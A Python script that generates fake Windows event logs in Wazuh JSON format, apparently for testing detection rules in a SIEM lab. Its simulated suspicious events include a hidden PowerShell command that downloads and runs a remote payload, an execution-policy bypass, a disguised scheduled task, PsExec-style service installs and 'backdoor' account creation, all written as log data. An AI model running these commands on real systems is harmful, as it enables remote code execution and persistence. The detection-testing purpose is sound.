#!/usr/bin/env python3
"""
Fake Windows Event Log Generator
Writes realistic Windows Security/System events in Wazuh's JSON format.
Wazuh's built-in windows-eventchannel decoder parses these natively.
"""

import json
import time
import random
import os
import sys
from datetime import datetime, timezone

COMPUTER = os.environ.get("WIN_HOSTNAME", "WIN-PC-01")
LOG_FILE = "/var/log/win-eventlog.json"

USERNAMES = ["jsmith", "agarcia", "bwilson", "Administrator", "svc_backup", "svc_sql"]
SOURCE_IPS = ["10.0.0.5", "10.0.0.12", "192.168.1.50", "172.16.0.88", "185.220.101.5"]
PROCESSES = [
    "C:\\Windows\\System32\\cmd.exe",
    "C:\\Windows\\System32\\powershell.exe",
    "C:\\Windows\\System32\\wscript.exe",
    "C:\\Windows\\SysWOW64\\mshta.exe",
    "C:\\Users\\jsmith\\AppData\\Local\\Temp\\payload.exe",
    "C:\\Windows\\System32\\svchost.exe",
    "C:\\Windows\\System32\\net.exe",
    "C:\\Windows\\System32\\whoami.exe",
]
PARENT_PROCESSES = [
    "C:\\Windows\\System32\\services.exe",
    "C:\\Windows\\System32\\cmd.exe",
    "C:\\Windows\\explorer.exe",
    "C:\\Windows\\System32\\powershell.exe",
    "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
]


def ts():
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.000000000Z")


def event_failed_logon():
    return {"win": {"system": {
        "providerName": "Microsoft-Windows-Security-Auditing",
        "eventID": "4625",
        "level": "0",
        "task": "12544",
        "keywords": "0x8010000000000000",
        "systemTime": ts(),
        "computer": COMPUTER,
        "channel": "Security",
    }, "eventdata": {
        "targetUserName": random.choice(USERNAMES),
        "ipAddress": random.choice(SOURCE_IPS),
        "logonType": str(random.choice([3, 10])),
        "failureReason": "%%2313",
        "status": "0xc000006d",
        "subStatus": "0xc000006a",
    }}}


def event_successful_logon():
    return {"win": {"system": {
        "providerName": "Microsoft-Windows-Security-Auditing",
        "eventID": "4624",
        "level": "0",
        "task": "12544",
        "keywords": "0x8020000000000000",
        "systemTime": ts(),
        "computer": COMPUTER,
        "channel": "Security",
    }, "eventdata": {
        "targetUserName": random.choice(USERNAMES),
        "ipAddress": random.choice(SOURCE_IPS),
        "logonType": str(random.choice([2, 3, 10])),
        "logonProcessName": "NtLmSsp",
    }}}


def event_process_creation(suspicious=False):
    if suspicious:
        image = "C:\\Windows\\System32\\powershell.exe"
        cmdline = random.choice([
            "powershell.exe -EncodedCommand " + "A" * 64,
            "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.5/payload')",
            "powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\Public\\run.ps1",
        ])
        parent = "C:\\Windows\\System32\\cmd.exe"
    else:
        image = random.choice(PROCESSES)
        cmdline = image
        parent = random.choice(PARENT_PROCESSES)

    return {"win": {"system": {
        "providerName": "Microsoft-Windows-Sysmon",
        "eventID": "1",
        "level": "4",
        "task": "1",
        "keywords": "0x8000000000000000",
        "systemTime": ts(),
        "computer": COMPUTER,
        "channel": "Microsoft-Windows-Sysmon/Operational",
    }, "eventdata": {
        "image": image,
        "commandLine": cmdline,
        "parentImage": parent,
        "user": COMPUTER + "\\" + random.choice(USERNAMES),
        "hashes": "MD5=" + "A" * 32,
    }}}


def event_service_install():
    svc_names = ["PSEXESVC", "RemCom_communicator", "winexesvc", "SvcHost32"]
    return {"win": {"system": {
        "providerName": "Service Control Manager",
        "eventID": "7045",
        "level": "4",
        "task": "0",
        "keywords": "0x8080000000000000",
        "systemTime": ts(),
        "computer": COMPUTER,
        "channel": "System",
    }, "eventdata": {
        "serviceName": random.choice(svc_names),
        "imagePathName": "%SystemRoot%\\" + random.choice(svc_names) + ".exe",
        "serviceType": "user mode service",
        "startType": "demand start",
        "accountName": "LocalSystem",
    }}}


def event_user_created():
    return {"win": {"system": {
        "providerName": "Microsoft-Windows-Security-Auditing",
        "eventID": "4720",
        "level": "0",
        "task": "13824",
        "keywords": "0x8020000000000000",
        "systemTime": ts(),
        "computer": COMPUTER,
        "channel": "Security",
    }, "eventdata": {
        "targetUserName": "backdoor" + str(random.randint(1, 99)),
        "subjectUserName": random.choice(USERNAMES),
    }}}


def event_scheduled_task():
    return {"win": {"system": {
        "providerName": "Microsoft-Windows-Security-Auditing",
        "eventID": "4698",
        "level": "0",
        "task": "12804",
        "keywords": "0x8020000000000000",
        "systemTime": ts(),
        "computer": COMPUTER,
        "channel": "Security",
    }, "eventdata": {
        "taskName": "\\Microsoft\\Windows\\UpdateCheck",
        "subjectUserName": random.choice(USERNAMES),
        "taskContent": "<Actions><Exec><Command>powershell.exe</Command><Arguments>-w hidden -c IEX(...)</Arguments></Exec></Actions>",
    }}}


# Weighted mix: mostly normal events, occasional suspicious ones
EVENT_POOL = [
    (event_failed_logon, 25),
    (event_successful_logon, 30),
    (lambda: event_process_creation(suspicious=False), 25),
    (lambda: event_process_creation(suspicious=True), 8),
    (event_service_install, 4),
    (event_user_created, 3),
    (event_scheduled_task, 5),
]

generators = []
for fn, weight in EVENT_POOL:
    generators.extend([fn] * weight)


def main():
    print(f"[win-sim] Starting event generator for {COMPUTER}", flush=True)
    print(f"[win-sim] Writing to {LOG_FILE}", flush=True)

    with open(LOG_FILE, "a", buffering=1) as f:
        while True:
            event = random.choice(generators)()
            f.write(json.dumps(event) + "\n")
            # Random interval: 2-15 seconds between events
            time.sleep(random.uniform(2, 15))


if __name__ == "__main__":
    main()
